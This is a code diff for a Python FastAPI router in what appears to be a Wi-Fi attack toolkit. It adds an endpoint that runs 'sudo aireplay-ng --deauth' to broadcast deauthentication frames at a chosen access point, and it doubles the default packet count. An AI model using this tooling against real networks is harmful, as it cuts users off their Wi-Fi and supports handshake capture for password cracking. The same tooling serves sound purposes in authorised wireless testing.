@@ -83,7 +83,7 @@ class CaptureRequest(BaseModel):
 class DeauthRequest(BaseModel):
     interface: str
     bssid: str
-    packets: int = 5
+    packets: int = 10  # 預設 10 個封包
     broadcast: bool = True
 
 # 定義破解請求模型
@@ -456,6 +456,64 @@ async def start_capture(request: CaptureRequest, background_tasks: BackgroundTas
             "success": False,
             "message": f"Failed to start capture: {str(e)}"
         }
+
+@router.post("/deauth/send")
+async def send_deauth(request: DeauthRequest):
+    """
+    發送解除認證封包
+    """
+    try:
+        # 構建 aireplay-ng 指令
+        # sudo aireplay-ng --deauth {packets} -a {bssid} {interface}
+        deauth_command = [
+            "sudo", "aireplay-ng",
+            "--deauth", str(request.packets),
+            "-a", request.bssid,
+            request.interface
+        ]
+        
+        # 如果不是廣播模式，可以加入特定客戶端MAC
+        # 這裡暫時只支援廣播模式（對所有連接的客戶端發送）
+        
+        # 執行指令
+        result = subprocess.run(
+            deauth_command,
+            capture_output=True, 
+            text=True, 
+            timeout=30  # 30秒超時
+        )
+        
+        if result.returncode == 0:
+            return {
+                "success": True,
+                "message": f"Successfully sent {request.packets} deauth packets to {request.bssid}",
+                "packets_sent": request.packets,
+                "target_bssid": request.bssid,
+                "interface": request.interface,
+                "command": " ".join(deauth_command),
+                "output": result.stdout
+            }
+        else:
+            return {
+                "success": False,
+                "message": f"Failed to send deauth packets: {result.stderr}",
+                "command": " ".join(deauth_command),
+                "error": result.stderr
+            }
+            
+    except subprocess.TimeoutExpired:
+        return {
+            "success": False,
+            "message": "Deauth command timed out (30 seconds)",
+            "packets_sent": 0
+        }
+    except Exception as e:
+        return {
+            "success": False,
+            "message": f"Error sending deauth packets: {str(e)}",
+            "packets_sent": 0
+        }
+
 
 @router.post("/capture/stop")
 async def stop_capture():
